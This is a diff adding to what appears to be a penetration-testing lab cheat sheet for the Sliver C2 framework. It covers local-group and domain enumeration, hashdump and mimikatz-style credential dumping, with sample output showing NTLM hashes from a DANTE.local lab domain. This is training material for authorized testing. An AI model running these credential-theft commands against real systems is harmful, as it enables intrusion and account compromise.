@@ -262,3 +262,93 @@ execute -o cmd.exe /c 'reg query HKCU /f password /t REG_SZ /s'
 ```
 execute-assembly -t 80 /home/ubuntu/Downloads/Autoruns64.exe -accepteula
 ```
+
+### sa-netlocalgroup
+
+* Coff-loader method of attaining local groups on a windows machines
+* Works on Domain Controllers as well
+
+```
+sa-netlocalgroup
+[*] Successfully executed sa-netlocalgroup (coff-loader)
+[*] Got output:
+Name:      Administrators
+Comment:   Administrators have complete and unrestricted access to the computer/domain
+--------------------------------
+Name:      Users
+Comment:   Users are prevented from making accidental or intentional system-wide changes and can run most applications
+--------------------------------
+Name:      Guests
+Comment:   Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
+--------------------------------
+--snip--
+```
+
+### Hashdump
+
+* Dump hashes from sliver session
+
+```
+hashdump
+[*] Successfully executed hashdump
+[*] Got output:
+Administrator:500:Administrator:500:aad3b435b51404eeaad3b435b51404ee:3317be94bdf8da53235f825815bda05a:::::
+Guest:501:Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
+```
+
+### c2tc-domaininfo
+
+* Enumerate domain information from a DC
+
+```
+d2tc-domaininfo
+[*] Successfully executed c2tc-domaininfo (coff-loader)
+[*] Got output:
+--------------------------------------------------------------------
+[+] DomainName:
+    DANTE.local
+[+] DomainGuid:
+    {BF59501C-28DB-4087-A02D-E6CFA4C2575D}
+[+] DnsForestName:
+    DANTE.local
+[+] DcSiteName:
+    Default-First-Site-Name
+[+] ClientSiteName:
+    Default-First-Site-Name
+[+] DomainControllerName (PDC):
+    \\DANTE-DC01.DANTE.local
+[+] DomainControllerAddress (PDC):
+    \\172.16.1.20
+[+] Default Domain Password Policy:
+    Password history length: 24
+    Maximum password age (d): 180
+    Minimum password age (d): 0
+    Minimum password length: 7
+[+] Account Lockout Policy:
+    Account lockout threshold: 0
+    Account lockout duration (m): 30
+    Account lockout observation window (m): 30
+[+] NextDc DnsHostName:
+    dante-dc01.dante.local
+```
+
+### creds\_all
+
+* dump all creds mimikatz style from a Windows machine, works on a domain controller
+
+```
+creds_all
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+msv credentials
+===============
+
+Username     Domain  NTLM                              SHA1
+--------     ------  ----                              ----
+DANTE-DC01$  DANTE   b12ff47444ad1cc6996fd2d681a3f136  dec3493ce38fca341cc189fe2513dd797e19ca85
+DANTE-DC01$  DANTE   8e387753e4e7e9901053030a0eafa53f  125870c6bbea628954c8e8767761cc1185622fe7
+MediaAdmin$  DANTE   7c53bb427b222695060d8fd771743fb9  10757578eb3902bd612c306bee80bf44da1efaab
+katwamba     DANTE   14a71f9de5448d83e8c63d46355837c3  61d3cacf6ad5f4571747b302a9658f7e85c5d516
+xadmin       DANTE   649f65054a6672a9898cb4eb61f9684a  b57e3049b5960ed60f1baa679ab0cfd4f68b0b06
+--snip--
+```
